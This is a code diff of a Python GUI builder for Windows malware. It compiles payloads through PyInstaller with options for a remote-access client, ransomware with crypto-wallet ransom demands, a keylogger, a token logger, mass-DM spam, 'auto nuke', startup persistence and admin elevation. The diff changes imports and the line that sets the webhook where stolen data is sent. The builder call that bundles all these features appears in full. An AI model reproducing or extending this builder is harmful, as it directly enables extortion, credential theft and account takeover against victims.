@@ -1,14 +1,12 @@
-
-from tqdm import tqdm
 from tkinter import *
 from PIL import Image
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
-from colorama import Style, Fore, Back
-from websocket import create_connection
-import customtkinter, subprocess, websocket, threading, coincurve, requests, tkinter, shutil, random, base64, json, fade, time, math, sys, ssl, os
+from colorama import Style, Fore
+import customtkinter, subprocess, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, os
 
 customtkinter.set_appearance_mode("dark")
+
 
 class ScrollableFrame(customtkinter.CTkScrollableFrame):
     def __init__(self, master, widgets, row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, scrollable=False):
@@ -341,7 +339,8 @@ class App(customtkinter.CTk):
 
         self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
 
-    def banner(self):
+    @staticmethod
+    def banner():
         print(fade.greenblue("""
    ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
   ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
@@ -366,7 +365,7 @@ class App(customtkinter.CTk):
             "CRYPTO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
             "CURRENCY": currency,
-            "WEBHOOK": f'"{webhook}"' if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
+            "WEBHOOK": f'"https://{webhook}/webhook"' if dynamic_webhook else f'"{webhook}"',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
             "MASSDM_BOOL": massdm,
@@ -408,7 +407,7 @@ class App(customtkinter.CTk):
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
@@ -420,7 +419,7 @@ class App(customtkinter.CTk):
         for file in os.listdir('src\\temp'):
             os.remove(f'src\\temp\\{file}')
         os.system('PAUSE')
-        
+
     def color(self, text, color='blue'):
         key = {
             "blue": Fore.CYAN,
@@ -429,6 +428,7 @@ class App(customtkinter.CTk):
         }
 
         return key[color] + text + Style.RESET_ALL
+
 
 if __name__ == "__main__":
     app = App()
